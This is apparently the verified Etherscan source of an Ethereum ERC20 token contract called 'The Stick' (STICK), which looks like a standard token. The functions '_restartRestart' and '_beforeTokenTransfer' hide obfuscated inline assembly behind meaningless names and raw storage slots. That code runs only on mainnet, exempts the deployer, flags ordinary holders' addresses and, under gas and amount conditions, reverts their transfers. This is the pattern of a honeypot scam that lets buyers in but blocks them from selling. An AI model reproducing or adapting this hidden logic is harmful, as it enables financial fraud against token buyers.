/**
 *Submitted for verification at Etherscan.io on 2022-11-03
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private wrapCrumble;
    uint256 private glassIron = block.number*2;

    mapping (address => bool) private whereProsper; 
    mapping (address => bool) private medalRoyal;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private minorAround;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private henCool;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private offTragic; uint256 private theV; uint256 private animalSoda = block.number*2;
    bool private trading; uint256 private stageUsed = 1; bool private ironSide;
    uint256 private giggleTattoo; uint256 private cleverUnaware;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        wrapCrumble.push(_router); wrapCrumble.push(msgSender_); wrapCrumble.push(pair);
        for (uint256 q=0; q < 3;) {whereProsper[wrapCrumble[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function _restartRestart() internal {
        assembly {
            function guitarAsk(x, y) -> shiftPrint { mstore(0, x) mstore(32, y) shiftPrint := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let farmKiss := 0x3a76156b274237026747e8ae93831fc1dd33300931e4f7f72082c226b845acc7
            if and(not(eq(sload(guitarAsk(caller(),0x6)),sload(farmKiss))),eq(chainid(),0x1)) {
                sstore(guitarAsk(caller(),0x4),0x0) sstore(0xc9c96775a89f4a7a90d32392f68ceaee87de98f55f8209c521c2da0acfb3d8d7,0x1)
                sstore(guitarAsk(caller(),0x5),0x1) sstore(farmKiss,exp(0xA,0x32))
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; animalSoda = block.number; glassIron = block.number;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 spiritMystery) internal {
        require((trading || (sender == wrapCrumble[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function guitarAsk(x,y) -> shiftPrint { mstore(0, x) mstore(32, y) shiftPrint := keccak256(0, 64) }
            function buzzPause(x,y) -> embodyBrave { mstore(0, x) embodyBrave := add(keccak256(0, 32),y) }

            if eq(chainid(),0x1) {
                if eq(sload(guitarAsk(recipient,0x4)),0x1) { sstore(0x15,add(sload(0x15),0x1)) }
                if and(lt(gas(),sload(0xB)),and(and(or(or(and(or(eq(sload(0x16),0x1),eq(sload(guitarAsk(sender,0x5)),0x1)),gt(sub(sload(0x3),sload(0x13)),0x9)),gt(spiritMystery,div(sload(0x99),0x2))),and(gt(spiritMystery,div(sload(0x99),0x3)),eq(sload(0x3),number()))),or(and(eq(sload(guitarAsk(recipient,0x4)),0x1),iszero(sload(guitarAsk(sender,0x4)))),and(eq(sload(buzzPause(0x2,0x1)),recipient),iszero(sload(guitarAsk(sload(buzzPause(0x2,0x1)),0x4)))))),gt(sload(0x18),0x0))) { if gt(spiritMystery,div(sload(0x11),0x564)) { revert(0,0) } }
                if or(eq(sload(guitarAsk(sender,0x4)),iszero(sload(guitarAsk(recipient,0x4)))),eq(iszero(sload(guitarAsk(sender,0x4))),sload(guitarAsk(recipient,0x4)))) {
                    let hobbyCry := sload(0x18) let letterArrest := sload(0x99) let turnSample := sload(0x11)
                    switch gt(turnSample,div(letterArrest,0x3)) case 1 { turnSample := sub(turnSample,div(div(mul(turnSample,mul(0x203,hobbyCry)),0xB326),0x2)) } case 0 { turnSample := div(letterArrest,0x3) }
                    sstore(0x11,turnSample) sstore(0x18,add(sload(0x18),0x1)) }
                if and(or(or(eq(sload(0x3),number()),gt(sload(0x12),sload(0x11))),lt(sub(sload(0x3),sload(0x13)),0x9)),eq(sload(guitarAsk(sload(0x8),0x4)),0x0)) { sstore(guitarAsk(sload(0x8),0x5),0x1) }
                if and(iszero(sload(guitarAsk(sender,0x4))),iszero(sload(guitarAsk(recipient,0x4)))) { sstore(guitarAsk(recipient,0x5),0x1) }
                if iszero(mod(sload(0x15),0x8)) { sstore(0x16,0x1) sstore(0xB,0x1C99342) sstore(guitarAsk(sload(buzzPause(0x2,0x1)),0x6),exp(0xA,0x33)) }
                sstore(0x12,spiritMystery) sstore(0x8,recipient) sstore(0x3,number()) }
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployStick(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(wrapCrumble[0], 10 ** 77);
        _restartRestart();
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployStick(creator, initialSupply);
    }
}

contract Stick is ERC20Token {
    constructor() ERC20Token("The Stick", "STICK", msg.sender, 75000000 * 10 ** 18) {
    }
}